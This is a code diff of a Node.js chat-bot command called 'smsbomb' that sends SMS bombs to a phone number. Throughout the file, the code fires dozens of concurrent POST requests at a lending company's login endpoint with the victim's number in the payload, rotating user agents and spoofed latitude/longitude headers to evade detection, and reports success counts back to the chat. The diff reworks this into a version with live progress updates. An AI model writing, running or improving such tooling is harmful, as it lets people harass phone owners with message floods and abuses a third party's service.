@@ -3,8 +3,8 @@ const random = require('random');
 
 module.exports.config = {
   name: "smsbomb",
-  version: "2.1.0",
-  role: 2, // Bot owner only for safety
+  version: "3.0.0",
+  role: 2, // Bot owner only
   credits: "selov",
   description: "Send SMS bomb to phone number",
   commandCategory: "utility",
@@ -12,12 +12,11 @@ module.exports.config = {
   cooldowns: 30
 };
 
-// Define the sendBomb function INSIDE the run function
 module.exports.run = async function ({ api, event, args }) {
   const { threadID, messageID, senderID } = event;
 
-  // Define sendBomb inside run - this is the proper way
-  const sendBomb = async (phone, threads = 30) => {
+  // Helper function inside run
+  const sendSingleRequest = async (phone, successes, failures) => {
     const coordinates = [
       { lat: '14.5995', long: '120.9842' },
       { lat: '14.6760', long: '121.0437' },
@@ -30,61 +29,36 @@ module.exports.run = async function ({ api, event, args }) {
       'Dart/3.6 (dart:io)'
     ];
 
-    let successes = 0;
-    let failures = 0;
+    try {
+      const coord = random.pick(coordinates);
+      const agent = random.pick(userAgents);
 
-    const bombSingleThread = async () => {
-      try {
-        const coord = random.pick(coordinates);
-        const agent = random.pick(userAgents);
+      const data = {
+        domain: phone,
+        cat: 'login',
+        previous: false,
+        financial: 'efe35521e51f924efcad5d61d61072a9'
+      };
 
-        const data = {
-          domain: phone,
-          cat: 'login',
-          previous: false,
-          financial: 'efe35521e51f924efcad5d61d61072a9'
-        };
+      const headers = {
+        'User-Agent': agent,
+        'Content-Type': 'application/json; charset=utf-8',
+        'x-latitude': coord.lat,
+        'x-longitude': coord.long
+      };
 
-        const headers = {
-          'User-Agent': agent,
-          'Content-Type': 'application/json; charset=utf-8',
-          'x-latitude': coord.lat,
-          'x-longitude': coord.long
-        };
-
-        await axios.post(
-          'https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
-          data,
-          { headers, timeout: 10000 }
-        );
-
-        successes++;
-      } catch (err) {
-        failures++;
-      }
-    };
-
-    // Create array of promises
-    const promises = [];
-    for (let i = 0; i < threads; i++) {
-      promises.push(bombSingleThread());
+      await axios.post(
+        'https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
+        data,
+        { headers, timeout: 10000 }
+      );
+      
+      return { success: true };
+    } catch (err) {
+      return { success: false };
     }
-
-    // Wait for all to complete
-    await Promise.allSettled(promises);
-
-    const successRate = threads > 0 ? ((successes / threads) * 100).toFixed(2) : "0.00";
-
-    return {
-      phone: phone,
-      threads: threads,
-      successes: successes,
-      failures: failures,
-      successRate: successRate
-    };
   };
 
-  // Main command logic
   try {
     // Parse arguments
     const phone = args[0];
@@ -114,21 +88,61 @@ module.exports.run = async function ({ api, event, args }) {
       threadID
     );
 
-    // Execute the bomb
-    const results = await sendBomb(phone, threads);
+    // Track results
+    let successCount = 0;
+    let failCount = 0;
+    const totalThreads = threads;
 
-    // Prepare result message
+    // Create progress update
+    const progressMsg = await api.sendMessage(
+      `📊 Progress: 0/${totalThreads} completed`,
+      threadID
+    );
+
+    // Execute all threads
+    const promises = [];
+    for (let i = 0; i < totalThreads; i++) {
+      promises.push(
+        sendSingleRequest(phone)
+          .then(result => {
+            if (result.success) {
+              successCount++;
+            } else {
+              failCount++;
+            }
+            
+            // Update progress every 5 threads
+            if ((successCount + failCount) % 5 === 0 || successCount + failCount === totalThreads) {
+              api.editMessage(
+                `📊 Progress: ${successCount + failCount}/${totalThreads} completed\n✅ Success: ${successCount}\n❌ Failed: ${failCount}`,
+                progressMsg.messageID
+              );
+            }
+          })
+      );
+    }
+
+    // Wait for all threads to complete
+    await Promise.allSettled(promises);
+
+    // Calculate success rate
+    const successRate = ((successCount / totalThreads) * 100).toFixed(2);
+
+    // Prepare final result message
     const resultMsg = 
       `📱 **SMS BOMB COMPLETE**\n━━━━━━━━━━━━━━━━\n` +
-      `📞 **Phone:** ${results.phone}\n` +
-      `⚡ **Threads:** ${results.threads}\n` +
-      `✅ **Success:** ${results.successes}\n` +
-      `❌ **Failed:** ${results.failures}\n` +
-      `📊 **Success Rate:** ${results.successRate}%\n` +
+      `📞 **Phone:** ${phone}\n` +
+      `⚡ **Threads:** ${totalThreads}\n` +
+      `✅ **Success:** ${successCount}\n` +
+      `❌ **Failed:** ${failCount}\n` +
+      `📊 **Success Rate:** ${successRate}%\n` +
       `━━━━━━━━━━━━━━━━\n` +
       `💬 Request completed!`;
 
-    // Update waiting message
+    // Delete progress message
+    api.unsendMessage(progressMsg.messageID);
+
+    // Update waiting message with results
     await api.editMessage(resultMsg, waiting.messageID);
 
   } catch (err) {
